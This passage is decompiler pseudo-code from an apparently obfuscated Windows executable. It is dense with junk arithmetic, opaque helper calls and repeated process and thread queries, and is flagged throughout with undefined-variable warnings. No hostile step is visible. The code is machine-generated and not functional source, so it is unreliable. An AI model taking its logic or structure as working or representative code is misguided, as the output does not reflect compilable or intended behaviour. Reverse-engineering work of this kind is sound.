  sub_411EBC(a1, a2, a3);
  sub_411A11(0, v7, a4 - 264, 0, 2, 36);
  sub_412905(17, v8);
  sub_41188A(v6, v5, 4, a4 - 136);
  sub_403BC9(v4, dword_444B82);
  __asm { retn }
}
// 402FEB: positive sp value 4 has been found
// 4130A8: variable 'v7' is possibly undefined
// 4130B2: variable 'v8' is possibly undefined
// 412718: variable 'v6' is possibly undefined
// 412718: variable 'v5' is possibly undefined
// 401E8E: variable 'v4' is possibly undefined
// 444B82: using guessed type int dword_444B82;
// 444BBA: using guessed type int dword_444BBA;
// 444BC6: using guessed type int dword_444BC6;

//----- (00413142) --------------------------------------------------------
int __userpurge sub_413142@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5)
{
  int v5; // eax
  int v7; // eax
  bool v8; // cf
  int v9; // [esp+118h] [ebp-F8h]
  int v10; // [esp+17Ch] [ebp-94h]

  v7 = v10 + __CFADD__(a1 + 35633, a1 + 35633) + 2 * (a1 + 35633) + 4349;
  if ( a3 )
    goto LABEL_4;
  v8 = 0;
  if ( (v7 & a2) == 0 )
  {
    v7 = -v9;
LABEL_4:
    v5 = v7 & 0x3C2;
    v8 = __CFADD__(v5, 14781);
    v7 = v5 + 14781;
  }
  return (v7 - (v8 + 10039)) ^ 0x3FDF | 0x323C;
}
// 41315C: variable 'v10' is possibly undefined
// 411DF8: variable 'v9' is possibly undefined

//----- (0041329F) --------------------------------------------------------
int __fastcall sub_41329F(int a1, int a2, int a3, int a4, int a5)
{
  int v5; // ecx
  int v6; // edx
  int v7; // ecx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  __int16 v10; // ax
  bool v11; // cf
  int v12; // eax
  unsigned int v13; // eax
  int v14; // edx
  int v15; // ecx
  int v17; // eax
  int v18; // eax
  unsigned int v19; // eax
  int v20; // [esp+44h] [ebp-250h]
  int v21; // [esp+68h] [ebp-22Ch]
  char v22[44]; // [esp+84h] [ebp-210h] BYREF
  char v23[4]; // [esp+B0h] [ebp-1E4h] BYREF
  char v24[52]; // [esp+B4h] [ebp-1E0h] BYREF
  char v25[172]; // [esp+E8h] [ebp-1ACh] BYREF
  char v26[16]; // [esp+194h] [ebp-100h] BYREF
  char v27[60]; // [esp+1A4h] [ebp-F0h] BYREF
  unsigned int v28; // [esp+1E0h] [ebp-B4h]
  int v29; // [esp+204h] [ebp-90h]
  unsigned __int8 v30; // [esp+25Ch] [ebp-38h]

  sub_41415A(0, a2, 0, v21);
  sub_413142(0, v14, (int)v22, (int)v22, 0);
  sub_411A11(v30 ^ 0x3325, v5, (int)v23, 0, 24, 8);
  sub_413142((int)v25, v6, v7, (int)v25, 0);
  v10 = 5365;
  v11 = v9 < v8;
  if ( v9 < v8 )
    goto LABEL_2;
  LOWORD(v13) = 12701;
  if ( v9 != v28 )
    goto LABEL_5;
  v13 = (v9 < v28) + 14594;
  if ( v13 > v9 )
    goto LABEL_7;
  v17 = 0;
  if ( (v9 & 0x3A19) != 0 )
    goto LABEL_15;
  v12 = 8467;
  if ( v20 == v8 )
  {
    v10 = 7343;
    v11 = 0;
LABEL_2:
    v19 = ((((v10 + v11 + v10) & 0xAFE) + 16339) | 0x2896) - v29;
    v13 = ((__PAIR64__(v19 - 15369, v19) - 0xCB00003C09i64) >> 32) - 10806;
LABEL_5:
    LOWORD(v13) = v13 | 0x1AC1;
LABEL_7:
    v17 = v13 & 0x33AB;
LABEL_15:
    v12 = ((v17 | 0x1E16) ^ 0x1422) - 7759;
  }
  v18 = sub_413142(v12, (int)v24, v9, (int)v24, 0);
  sub_411A11(v18, (int)v27, (int)v27, 0, 35, 53);
  return sub_41188A(v15, (int)v26, 30, (int)v26);
}
// 4132B1: variable 'v21' is possibly undefined
// 4133CD: variable 'v14' is possibly undefined
// 411C04: variable 'v5' is possibly undefined
// 41264B: variable 'v6' is possibly undefined
// 41264B: variable 'v7' is possibly undefined
// 412742: variable 'v9' is possibly undefined
// 412742: variable 'v8' is possibly undefined
// 4135D2: variable 'v15' is possibly undefined
// 413F09: variable 'v20' is possibly undefined

//----- (00413324) --------------------------------------------------------
int __fastcall sub_413324(int a1, int a2, int a3, int a4, int a5)
{
  unsigned int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  void *v8; // ecx
  int v9; // eax
  int v10; // ecx
  unsigned int v11; // eax
  int v12; // eax
  unsigned int v13; // edx
  int v14; // ecx
  int v15; // ecx
  void *v16; // ecx
  int v17; // edx
  int v18; // ecx
  int v19; // eax
  unsigned int v20; // edx
  unsigned int v21; // ecx
  int v22; // eax
  int v23; // eax
  unsigned int v24; // ecx
  void *v25; // ecx
  int v27; // eax
  int v28; // eax
  unsigned int v29; // ecx
  int v30; // edx
  void *v31; // ecx
  int v32; // eax
  bool v33; // cf
  int v34; // eax
  int v35; // eax
  unsigned int v36; // edx
  int v37; // ecx
  int v38; // ecx
  int v39; // edx
  unsigned int v40; // ecx
  int v41; // [esp-4h] [ebp-254h]
  char v42[8]; // [esp+Ch] [ebp-244h] BYREF
  int v43[3]; // [esp+14h] [ebp-23Ch] BYREF
  char v44[8]; // [esp+20h] [ebp-230h] BYREF
  int v45; // [esp+28h] [ebp-228h]
  char v46[4]; // [esp+30h] [ebp-220h] BYREF
  unsigned int v47; // [esp+34h] [ebp-21Ch]
  char v48[20]; // [esp+44h] [ebp-20Ch] BYREF
  char v49[4]; // [esp+58h] [ebp-1F8h] BYREF
  char v50[4]; // [esp+5Ch] [ebp-1F4h] BYREF
  char v51[4]; // [esp+6Ch] [ebp-1E4h] BYREF
  int v52; // [esp+70h] [ebp-1E0h]
  int v53; // [esp+7Ch] [ebp-1D4h]
  int v54; // [esp+84h] [ebp-1CCh]
  int v55; // [esp+A0h] [ebp-1B0h]
  char v56[20]; // [esp+C8h] [ebp-188h] BYREF
  int v57; // [esp+E0h] [ebp-170h]
  char v58[156]; // [esp+ECh] [ebp-164h] BYREF
  int v59; // [esp+194h] [ebp-BCh]
  char v60[16]; // [esp+1A0h] [ebp-B0h] BYREF
  int v61; // [esp+1B0h] [ebp-A0h]
  char v62[24]; // [esp+1B8h] [ebp-98h] BYREF
  char v63[12]; // [esp+1D4h] [ebp-7Ch] BYREF
  unsigned int v64; // [esp+1E0h] [ebp-70h]
  int v65; // [esp+20Ch] [ebp-44h]
  int v66; // [esp+240h] [ebp-10h]

  sub_41188A((int)v46, a2, 39, (int)v46);
  sub_412905(10, v57);
  sub_412905(1, v6);
  sub_411C99(v29, 0, 0, (int)v63, (int)v63, 0);
  sub_41188A(v7, (int)v63, 23, (int)v63);
  sub_412905(9, 2136167811);
  do
  {
    sub_40382D();
    v35 = (((sub_412905(57, 1203005452) | 0x32CE) + 8138) ^ 0x30CB) - 10514;
    if ( !v37 )
      v54 |= v35;
    sub_411C99((unsigned int)v43, v36, 0, v66, (int)v43, 0);
    v32 = sub_411F4C(v31, 24, 55, 6, v30) & 0x1471;
    v33 = __CFADD__(v32, 6930);
    v34 = v32 + 6930;
    v27 = v33 + v34 + 6381;
    if ( v27 )
    {
      v28 = v27 + 10662 + __CFADD__(v27, 10662) + v27 + 10662;
      v45 += __CFADD__(v28, v28) + 2 * v28 + 11951 - v53;
    }
    sub_411C99(0, 0, 0, 0, (int)v56, 0);
    sub_411F4C(v8, 18, 30, 27, 523042573);
    sub_411C99(0, v13, 0, v13, (int)v51, 0);
    sub_411A11(0, v14, (int)v49, 0, 33, 29);
    v41 = dword_444B86;
    sub_412905(27, v53);
    v19 = sub_41188A(v18, (int)v60, 33, (int)v60);
    v22 = sub_411EBC(v19, v20, v21);
    v23 = sub_412905(61, v22 + v33 + v22);
    v52 &= v23 + 14576;
    sub_411C99(v24, 0, 0, v24, (int)v58, 0);
    sub_411A11(2 * (unsigned __int8)v58[124], v15, (int)v62, 0, 26, 61);
    sub_41188A((int)v46, v17, 64, (int)v46);
    dword_443014 -= (int)&GetLastError;
    dword_444B86 = v41 - 1;
    v9 = sub_41188A(dword_4432DC, (int)v44, 62, (int)v44);
    sub_412905(7, v9);
    sub_411C99(v5, 0, 0, v5, (int)v42, 0);
    sub_411A11((int)v48, v10, (int)v48, 0, 53, 1);
    sub_412905(24, v38);
    if ( !v39 )
    {
      v11 = ((_WORD)v65 + 7321) & 0x31A;
      v33 = v47 < v11;
      v47 -= v11;
      v12 = v33 + v11 + 14551;
      if ( (v40 & 0xD48) == 0 && v40 >= v64 )
        v55 |= v12 - 1124;
    }
  }
  while ( dword_444B86 );
  sub_411A11((int)v50, v40, (int)v50, 0, 41, 60);
  sub_411F4C(v16, 63, 43, 5, v59);
  return sub_411F4C(v25, 12, 18, 27, v61) | 0x25A3;
}
// 4115B4: variable 'v6' is possibly undefined
// 413EF5: variable 'v29' is possibly undefined
// 4115C7: variable 'v7' is possibly undefined
// 411652: variable 'v8' is possibly undefined
// 4120FA: variable 'v13' is possibly undefined
// 412278: variable 'v14' is possibly undefined
// 412F61: variable 'v18' is possibly undefined
// 412F66: variable 'v20' is possibly undefined
// 412F66: variable 'v21' is possibly undefined
// 412F6B: variable 'v33' is possibly undefined
// 412F94: variable 'v24' is possibly undefined
// 4123B2: variable 'v15' is possibly undefined
// 412A4A: variable 'v17' is possibly undefined
// 4114F2: variable 'v5' is possibly undefined
// 4119E1: variable 'v10' is possibly undefined
// 414373: variable 'v38' is possibly undefined
// 411E81: variable 'v40' is possibly undefined
// 4128C9: variable 'v16' is possibly undefined
// 4130FA: variable 'v25' is possibly undefined
// 413117: variable 'v36' is possibly undefined
// 414077: variable 'v31' is possibly undefined
// 414077: variable 'v30' is possibly undefined
// 414324: variable 'v37' is possibly undefined
// 4143B0: variable 'v39' is possibly undefined
// 443014: using guessed type int dword_443014;
// 4432DC: using guessed type int dword_4432DC;
// 444B86: using guessed type int dword_444B86;

//----- (00413607) --------------------------------------------------------
int __userpurge sub_413607@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6)
{
  if ( (a2 & 0x327B) == 0 )
    result = (((_WORD)result + 2005) & 0x1E01)
           + 6363
           + __CFADD__(((_WORD)result + 2005) & 0x1E01, 6363)
           + (((_WORD)result + 2005) & 0x1E01)
           + 6363;
  return result;
}

//----- (00413ACB) --------------------------------------------------------
int __stdcall sub_413ACB(int a1, int a2, int a3)
{
  int v3; // eax
  int v4; // eax
  int v5; // edx
  int v6; // ecx
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned int v10; // edx
  unsigned int v11; // ecx
  int v12; // eax
  HANDLE v13; // eax
  unsigned int v14; // edx
  unsigned int v15; // ecx
  unsigned int v16; // edx
  unsigned int v17; // ecx
  int v18; // ecx
  HANDLE v19; // eax
  void *v20; // ecx
  __int16 v21; // ax
  void *v22; // ecx
  void *v23; // ecx
  int v24; // ecx
  unsigned int v25; // edx
  int v26; // eax
  int v27; // eax
  unsigned int v28; // edx
  unsigned int v29; // ecx
  unsigned int v30; // edx
  int v31; // eax
  int v32; // edx
  int v33; // eax
  int v34; // edx
  int v35; // ecx
  int v36; // eax
  int v37; // ecx
  int v38; // eax
  unsigned int v39; // edx
  unsigned int v40; // ecx
  int v41; // eax
  int v42; // ecx
  int v43; // eax
  unsigned int v44; // edx
  unsigned int v45; // ecx
  int v46; // eax
  int v47; // edx
  void *v48; // ecx
  int v49; // edx
  int v50; // eax
  int v51; // edx
  int v52; // ecx
  int v53; // ecx
  __int16 v54; // ax
  int v55; // edx
  int v56; // ecx
  int v57; // eax
  int v58; // ecx
  int v59; // ecx
  int v60; // eax
  unsigned int v61; // edx
  unsigned int v62; // ecx
  void *v63; // ecx
  int v64; // eax
  unsigned int v65; // edx
  unsigned int v66; // ecx
  int v67; // eax
  int v68; // edx
  void *v69; // ecx
  __int16 v70; // ax
  unsigned int v71; // edx
  unsigned int v72; // ecx
  void *v73; // ecx
  int v74; // eax
  unsigned int v75; // edx
  char v76; // cf
  int v77; // eax
  int v78; // ecx
  int v79; // edx
  int v80; // ecx
  void *v81; // ecx
  int v82; // eax
  unsigned int v83; // ecx
  unsigned int v84; // ecx
  unsigned int v85; // edx
  HANDLE v86; // eax
  unsigned int v87; // edx
  unsigned int v88; // ecx
  int v89; // edx
  int v90; // ecx
  int v91; // eax
  unsigned int v92; // edx
  unsigned int v93; // ecx
  int v94; // eax
  int v95; // ecx
  int v96; // ecx
  int v97; // ecx
  void *v98; // ecx
  int v99; // eax
  int v100; // edx
  int v101; // eax
  __int16 v102; // dx
  unsigned __int16 v103; // ax
  int v104; // edx
  void *v105; // ecx
  int v106; // eax
  unsigned int v107; // edx
  unsigned int v108; // ecx
  int v109; // ecx
  void *v110; // ecx
  int v111; // eax
  unsigned int v112; // ecx
  int v113; // ecx
  int v114; // ecx
  int v115; // ecx
  int v116; // ecx
  unsigned int v117; // ecx
  HANDLE v118; // eax
  unsigned int v119; // edx
  unsigned int v120; // ecx
  int v121; // eax
  int v122; // ecx
  HANDLE v123; // eax
  int v124; // eax
  int v125; // edx
  int v126; // eax
  int v127; // ecx
  unsigned int v128; // edx
  unsigned int v129; // ecx
  int v130; // edx
  void *v131; // ecx
  int v132; // eax
  unsigned int v133; // edx
  unsigned int v134; // ecx
  int v135; // edx
  int v136; // ecx
  void *v137; // ecx
  int v138; // edx
  unsigned __int16 v140; // ax
  int v141; // eax
  unsigned int v142; // edx
  unsigned int v143; // ecx
  int v144; // eax
  int v145; // ecx
  int v146; // ecx
  int v147; // ecx
  int v148; // eax
  int v149; // edx
  void *v150; // ecx
  int v151; // ecx
  int v152; // eax
  int v153; // ecx
  int v154; // eax
  unsigned int v155; // edx
  unsigned int v156; // ecx
  unsigned int v157; // ecx
  int v158; // edx
  void *v159; // ecx
  unsigned int v160; // ecx
  int v161; // [esp-4h] [ebp-2A0h]
  char v162[12]; // [esp+4h] [ebp-298h] BYREF
  char v163[4]; // [esp+10h] [ebp-28Ch] BYREF
  int v164; // [esp+14h] [ebp-288h]
  int v165[4]; // [esp+28h] [ebp-274h] BYREF
  int v166; // [esp+38h] [ebp-264h] BYREF
  int v167; // [esp+3Ch] [ebp-260h] BYREF
  char v168[4]; // [esp+40h] [ebp-25Ch] BYREF
  __int16 v169[14]; // [esp+44h] [ebp-258h] BYREF
  int v170; // [esp+60h] [ebp-23Ch]
  int v171; // [esp+6Ch] [ebp-230h] BYREF
  char v172[4]; // [esp+70h] [ebp-22Ch] BYREF
  char v173[12]; // [esp+74h] [ebp-228h] BYREF
  char v174[4]; // [esp+80h] [ebp-21Ch] BYREF
  unsigned int v175; // [esp+84h] [ebp-218h]
  char v176[12]; // [esp+94h] [ebp-208h] BYREF
  char v177[4]; // [esp+A0h] [ebp-1FCh] BYREF
  char v178[8]; // [esp+A4h] [ebp-1F8h] BYREF
  int v179; // [esp+ACh] [ebp-1F0h]
  char v180[8]; // [esp+B4h] [ebp-1E8h] BYREF
  int v181; // [esp+C4h] [ebp-1D8h]
  char v182[8]; // [esp+CCh] [ebp-1D0h] BYREF
  int v183; // [esp+D4h] [ebp-1C8h]
  char v184[8]; // [esp+DCh] [ebp-1C0h] BYREF
  int v185[2]; // [esp+E4h] [ebp-1B8h] BYREF
  char v186[4]; // [esp+100h] [ebp-19Ch] BYREF
  int v187; // [esp+104h] [ebp-198h]
  char v188[4]; // [esp+108h] [ebp-194h] BYREF
  int v189[2]; // [esp+10Ch] [ebp-190h] BYREF
  char v190[4]; // [esp+114h] [ebp-188h] BYREF
  char v191[8]; // [esp+118h] [ebp-184h] BYREF
  char v192[8]; // [esp+120h] [ebp-17Ch] BYREF
  char v193[12]; // [esp+128h] [ebp-174h] BYREF
  int v194; // [esp+134h] [ebp-168h]
  char v195[4]; // [esp+138h] [ebp-164h] BYREF
  int v196; // [esp+144h] [ebp-158h]
  char v197[28]; // [esp+154h] [ebp-148h] BYREF
  char v198[12]; // [esp+170h] [ebp-12Ch] BYREF
  int v199; // [esp+17Ch] [ebp-120h] BYREF
  char v200[8]; // [esp+184h] [ebp-118h] BYREF
  char v201[4]; // [esp+18Ch] [ebp-110h] BYREF
  char v202[8]; // [esp+190h] [ebp-10Ch] BYREF
  int v203; // [esp+198h] [ebp-104h]
  char v204[4]; // [esp+1B0h] [ebp-ECh] BYREF
  int v205[4]; // [esp+1BCh] [ebp-E0h] BYREF
  char v206[8]; // [esp+1CCh] [ebp-D0h] BYREF
  char v207[4]; // [esp+1D4h] [ebp-C8h] BYREF
  char v208[12]; // [esp+1D8h] [ebp-C4h] BYREF
  char v209[4]; // [esp+1E4h] [ebp-B8h] BYREF
  char v210[4]; // [esp+1F0h] [ebp-ACh] BYREF
  int v211; // [esp+1F4h] [ebp-A8h]
  char v212[4]; // [esp+1FCh] [ebp-A0h] BYREF
  char v213[12]; // [esp+200h] [ebp-9Ch] BYREF
  char v214[28]; // [esp+20Ch] [ebp-90h] BYREF
  int v215; // [esp+228h] [ebp-74h] BYREF
  char v216[4]; // [esp+22Ch] [ebp-70h] BYREF
  char v217[12]; // [esp+230h] [ebp-6Ch] BYREF
  int v218; // [esp+23Ch] [ebp-60h] BYREF
  char v219[4]; // [esp+244h] [ebp-58h] BYREF
  int v220; // [esp+248h] [ebp-54h] BYREF
  int v221; // [esp+24Ch] [ebp-50h]
  char v222[4]; // [esp+250h] [ebp-4Ch] BYREF
  int v223; // [esp+254h] [ebp-48h]
  int v224; // [esp+284h] [ebp-18h]

  sub_412905(57, v194);
  sub_411F4C(v150, 17, 53, 44, (int)v150);
  GetCurrentProcess();
  sub_411F4C(v63, 2, 30, 35, (int)v63);
  v50 = (sub_412905(23, v183) & 0x695 ^ 0x1A26) - 15167;
  sub_411C99(v160, (unsigned int)v191, 0, v50, (int)v191, 0);
  GetCurrentThreadId();
  sub_413142(0, v130, (int)&v166, (int)&v166, 0);
  sub_411F4C(v131, 26, 26, 35, v181);
  sub_411F4C(v48, 35, 35, 24, v47);
  sub_41188A((int)&v218, v49, 13, (int)&v218);
  GetCurrentProcess();
  sub_411C99(v112, (unsigned int)&v220, 0, (int)&v220, (int)&v220, 0);
  GetCurrentProcess();
  sub_412905(20, v113);
  v38 = sub_41188A(v37, (int)v177, 56, (int)v177);
  v41 = sub_411EBC(v203 | v175 | v38, v39, v40);
  v194 |= v41;
  sub_411A11((int)v217, v109, (int)v217, 0, 41, 47);
  sub_411A11(0, v97, (int)v195, 0, 2, 8);
  GetCurrentThreadId();
  sub_412905(50, v196);
  sub_41188A(v146, (int)&v167, 38, (int)&v167);
  sub_41188A(v147, (int)v216, 34, (int)v216);
  v148 = GetCurrentProcessId();
  v141 = sub_411A11(v148, 0, (int)v200, 0, 10, 49);
  v144 = sub_411EBC(v141, v142, v143);
  sub_413142(v76 + v144 + 10894, (int)v173, v145, (int)v173, 0);
  v101 = sub_41188A((int)v193, v100, 1, (int)v193);
  if ( (v102 & 0x1C62) == 0 )
    v101 -= 14086;
  v3 = sub_411A11(v101, (int)&v215, (int)&v215, 0, 60, 25);
  v4 = v3 - (v76 + 12026);
  v185[0] ^= v4;
  v179 &= (v4 - 1729) | 0x799;
  v70 = sub_411F4C(v69, 57, 15, 14, v68);
  sub_411EBC(v70 & 0x318, v71, v72);
  sub_411F4C(v73, 41, 39, 33, 1553431153);
  v74 = GetCurrentThreadId();
  sub_411A11(v74, v58, (int)v222, 0, 5, 30);
  sub_411C99(v84, 0, 0, v84, (int)v174, 0);
  sub_411C99(0, v85, 0, (int)v201, (int)v201, 0);
  v86 = GetCurrentProcess();
  sub_411F4C(v98, 57, 5, 23, (int)v86);
  v103 = sub_411A11((int)v208, 0, (int)v208, 0, 1, 50);
  sub_413142((v103 ^ 0x123D) & 0x15FB, v104, (int)&v199, (int)&v199, 0);
  sub_411F4C(v105, 51, 18, 23, v183);
  GetCurrentProcess();
  sub_411F4C(v23, 21, 9, 38, 1163200599);
  sub_41188A(v24, (int)v216, 29, (int)v216);
  v54 = sub_413142((int)v213, 0, v53, (int)v213, 0) - 1689;
  sub_411EBC((v54 & 0x1A42) - 1180, v87, v88);
  sub_412905(8, v89);
  v91 = sub_412905(24, v90);
  sub_411EBC(v91 + 9366, v92, v93);
  sub_411C99(0, 0, 0, -1246558926, (int)v182, 0);
  GetCurrentProcessId();
  v60 = sub_411A11((int)v214, v59, (int)v214, 0, 49, 53);
  sub_411A11(
    (((unsigned __int16)(((__PAIR64__(v60 - ((unsigned int)v76 + 1060), v60)
                         - (((unsigned int)v76 + 1060) | 0x29C200000000i64)) >> 32)
                       + 11549) ^ 0x15EE)
   + 6477) & 0x27C6 | 0x3BF4,
    v122,
    (int)&v171,
    0,
    27,
    57);
  v13 = GetCurrentProcess();
  v140 = sub_413142((int)v13, 0, (int)v207, (int)v207, 0);
  sub_411A11(((v140 ^ 0x1A11) & 0x6CA) + 8229, 0, (int)v212, 0, 1, 15);
  sub_41188A((int)v184, v149, 45, (int)v184);
  GetCurrentProcess();
  v33 = sub_413142(0, v32, (int)v195, (int)v195, 0);
  v36 = v33 | 0x3524;
  if ( !v34 )
    v187 -= v36;
  sub_411A11((int)&v218, v35, (int)&v218, 0, 45, 55);
  GetCurrentThreadId();
  v7 = sub_412905(37, v6);
  sub_413142(v7, 0, (int)v202, (int)v202, 0);
  sub_412905(54, -689568401);
  GetCurrentProcess();
  sub_41188A(v18, (int)v180, 28, (int)v180);
  v19 = GetCurrentProcess();
  v21 = sub_411F4C(v20, 55, 29, 29, (int)v19);
  sub_411F4C(v22, 56, 16, 59, v21 & 0x2CBE);
  sub_41188A(v80, v79, 45, (int)v197);
  v82 = sub_411F4C(v81, 30, 62, 6, (int)v81);
  v121 = v82 | 0x2D23;
  if ( v83 >= v175 )
    v218 += v121 + (v83 < v175);
  v9 = GetCurrentProcessId();
  sub_411EBC(v9, v10, v11);
  v12 = GetCurrentThreadId();
  sub_413142(v12, (int)v189, 0, (int)v189, 0);
  GetCurrentThreadId();
  v152 = sub_413142((int)v192, 0, v151, (int)v192, 0);
  v220 -= v205[1] & v152;
  sub_41188A(v52, v51, 11, (int)v205);
  GetCurrentThreadId();
  v111 = sub_411F4C(v110, 12, 2, 64, v166);
  v170 |= v111;
  sub_411A11(v111 ^ 0x3992, (int)v189, (int)v189, 0, 7, 22);
  sub_41188A((int)v173, v5, 60, (int)v173);
  sub_412905(38, v205[3]);
  sub_412905(47, v114);
  sub_41188A(v115, (int)v206, 31, (int)v206);
  GetCurrentProcess();
  sub_412905(21, v164);
  v106 = sub_411A11(0, (int)v168, (int)v168, 0, 12, 39);
  sub_411EBC(v76 + v106 + 10916, v107, v108);
  GetCurrentThreadId();
  sub_411A11((int)v178, 0, (int)v178, 0, 8, 21);
  sub_41188A(v116, (int)v172, 28, (int)v172);
  GetCurrentProcessId();
  sub_411C99(v117, 0, 0, -1287852736, (int)v190, 0);
  v118 = GetCurrentProcess();
  sub_411EBC((int)v118, v119, v120);
  v77 = sub_411C99(0, (unsigned int)v165, 0, (int)v165, (int)v165, 0);
  v223 += v77 + v76;
  v215 += v77;
  v94 = (v77 & 0x265B) - 12666;
  if ( !v78 )
    v164 -= v94;
  v123 = GetCurrentProcess();
  v124 = sub_411A11((int)v123, (int)v204, (int)v204, 0, 43, 47);
  v224 += v124 | 0x148E;
  v126 = (sub_41188A((int)v162, v125, 15, (int)v162) | 0x1D5E) - 4979;
  sub_411A11(v126, v96, (int)v163, 0, 13, 40);
  GetCurrentProcess();
  sub_411A11((int)v169, v95, (int)v169, 0, 4, 34);
  sub_411EBC(0, v61, v62);
  v31 = sub_411C99(0, v30, 0, v30, (int)v188, 0);
  sub_411EBC(v31 - 12323, v14, v15);
  sub_411EBC(-v76, v16, v17);
  GetCurrentProcess();
  GetCurrentProcess();
  sub_41188A(v56, v55, 29, (int)v165);
  v57 = sub_412905(55, 1366078036) ^ 0x3C0F;
  sub_411A11(v57, v127, (int)&v166, 0, 3, 18);
  sub_411EBC(0, v128, v129);
  GetCurrentThreadId();
  v26 = sub_411C99((unsigned int)v198, v25, 0, 0, (int)v198, 0);
  v211 -= v26;
  v27 = sub_412905(39, -1565050510);
  sub_411EBC(v27 + 14386, v28, v29);
  GetCurrentProcess();
  sub_411C99((unsigned int)v178, v75, 0, 0, (int)v178, 0);
  v64 = GetCurrentThreadId();
  v67 = sub_411EBC(v64, v65, v66);
  v221 |= v67;
  GetCurrentProcess();
  v43 = sub_411A11(0, v42, (int)v176, 0, 45, 49);
  v171 -= v43;
  v46 = sub_411EBC(-__CFADD__(v43, 13562), v44, v45);
  sub_411A11(__CFADD__(v46, 10313) + v46 + 10313 + 2629, (int)v165, (int)v165, 0, 40, 46);
  GetCurrentProcessId();
  GetCurrentProcess();
  v8 = sub_411C99((unsigned int)v185, 0, 0, v165[0], (int)v185, 0) & 0x360C;
  v154 = sub_413142(v8, (int)v214, v153, (int)v214, 0);
  sub_411EBC(v76 + v154 + 12222, v155, v156);
  GetCurrentProcess();
  sub_411C99(v157, 0, 0, v157, (int)v219, 0);
  GetCurrentThreadId();
  v161 = sub_411F4C(v159, 60, 9, 8, v158) - 15786 + 13183;
  v99 = sub_412905(5, v161) ^ 0x3B4D;
  sub_411A11(v99, (int)v186, (int)v186, 0, 2, 10);
  v132 = GetCurrentThreadId();
  sub_411EBC(v132, v133, v134);
  sub_413142((int)v209, v135, v136, (int)v209, 0);
  sub_411F4C(v137, 63, 37, 60, v189[0]);
  sub_413142((int)v210, v138, 0, (int)v210, 0);
  GetCurrentProcess();
  return 1768;
}
// 4141A9: variable 'v150' is possibly undefined
// 4123CE: variable 'v63' is possibly undefined
// 414339: variable 'v160' is possibly undefined
// 413CC9: variable 'v130' is possibly undefined
// 413CDF: variable 'v131' is possibly undefined
// 411EEF: variable 'v48' is possibly undefined
// 411EEF: variable 'v47' is possibly undefined
// 411EFF: variable 'v49' is possibly undefined
// 413806: variable 'v112' is possibly undefined
// 413814: variable 'v113' is possibly undefined
// 411D87: variable 'v37' is possibly undefined
// 411D98: variable 'v39' is possibly undefined
// 411D98: variable 'v40' is possibly undefined
// 41363B: variable 'v109' is possibly undefined
// 4132D7: variable 'v97' is possibly undefined
// 413F3E: variable 'v146' is possibly undefined
// 413F4E: variable 'v147' is possibly undefined
// 413EA0: variable 'v142' is possibly undefined
// 413EA0: variable 'v143' is possibly undefined
// 413EA5: variable 'v76' is possibly undefined
// 413EB3: variable 'v145' is possibly undefined
// 4133A6: variable 'v100' is possibly undefined
// 41266D: variable 'v69' is possibly undefined
// 41266D: variable 'v68' is possibly undefined
// 412677: variable 'v71' is possibly undefined
// 412677: variable 'v72' is possibly undefined
// 412691: variable 'v73' is possibly undefined
// 41215D: variable 'v58' is possibly undefined
// 412AC9: variable 'v84' is possibly undefined
// 412AE8: variable 'v85' is possibly undefined
// 41334C: variable 'v98' is possibly undefined
// 41348C: variable 'v104' is possibly undefined
// 4134A2: variable 'v105' is possibly undefined
// 411B62: variable 'v23' is possibly undefined
// 411B6D: variable 'v24' is possibly undefined
// 41210C: variable 'v53' is possibly undefined
// 412CE2: variable 'v87' is possibly undefined
// 412CE2: variable 'v88' is possibly undefined
// 412CEF: variable 'v89' is possibly undefined
// 412CFC: variable 'v90' is possibly undefined
// 412D06: variable 'v92' is possibly undefined
// 412D06: variable 'v93' is possibly undefined
// 4121AB: variable 'v59' is possibly undefined
// 413A96: variable 'v122' is possibly undefined
// 41408F: variable 'v149' is possibly undefined
// 411C52: variable 'v32' is possibly undefined
// 411511: variable 'v10' is possibly undefined
// 411511: variable 'v11' is possibly undefined
// 414232: variable 'v151' is possibly undefined
// 4120CA: variable 'v52' is possibly undefined
// 4120CA: variable 'v51' is possibly undefined
// 4137D7: variable 'v110' is possibly undefined
// 411322: variable 'v5' is possibly undefined
// 4138D1: variable 'v114' is possibly undefined
// 4138E6: variable 'v115' is possibly undefined
// 4134ED: variable 'v107' is possibly undefined
// 4134ED: variable 'v108' is possibly undefined
// 4139FA: variable 'v116' is possibly undefined
// 413A1B: variable 'v117' is possibly undefined
// 413A26: variable 'v119' is possibly undefined
// 413A26: variable 'v120' is possibly undefined
// 411B8A: variable 'v35' is possibly undefined
// 411466: variable 'v6' is possibly undefined
// 411A6A: variable 'v18' is possibly undefined
// 411A7C: variable 'v20' is possibly undefined
// 411A8D: variable 'v22' is possibly undefined
// 4129E5: variable 'v80' is possibly undefined
// 4129E5: variable 'v79' is possibly undefined
// 4129FE: variable 'v81' is possibly undefined
// 411C5E: variable 'v34' is possibly undefined
// 412DC3: variable 'v78' is possibly undefined
// 4133AB: variable 'v102' is possibly undefined
// 413A45: variable 'v83' is possibly undefined
// 413C59: variable 'v125' is possibly undefined
// 4131FD: variable 'v96' is possibly undefined
// 412DD5: variable 'v95' is possibly undefined
// 4121CA: variable 'v61' is possibly undefined
// 4121CA: variable 'v62' is possibly undefined
// 411C41: variable 'v30' is possibly undefined
// 4118F0: variable 'v14' is possibly undefined
// 4118F0: variable 'v15' is possibly undefined
// 4118F7: variable 'v16' is possibly undefined
// 4118F7: variable 'v17' is possibly undefined
// 41211E: variable 'v56' is possibly undefined
// 41211E: variable 'v55' is possibly undefined
// 413C8C: variable 'v127' is possibly undefined
// 413C98: variable 'v128' is possibly undefined
// 413C98: variable 'v129' is possibly undefined
// 411BAE: variable 'v25' is possibly undefined
// 411BCF: variable 'v28' is possibly undefined
// 411BCF: variable 'v29' is possibly undefined
// 41275C: variable 'v75' is possibly undefined
// 4124C6: variable 'v65' is possibly undefined
// 4124C6: variable 'v66' is possibly undefined
// 411DCE: variable 'v42' is possibly undefined
// 411DE0: variable 'v44' is possibly undefined
// 411DE0: variable 'v45' is possibly undefined
// 4142B2: variable 'v153' is possibly undefined
// 4142BC: variable 'v155' is possibly undefined
// 4142BC: variable 'v156' is possibly undefined
// 4142D6: variable 'v157' is possibly undefined
// 4142E8: variable 'v159' is possibly undefined
// 4142E8: variable 'v158' is possibly undefined
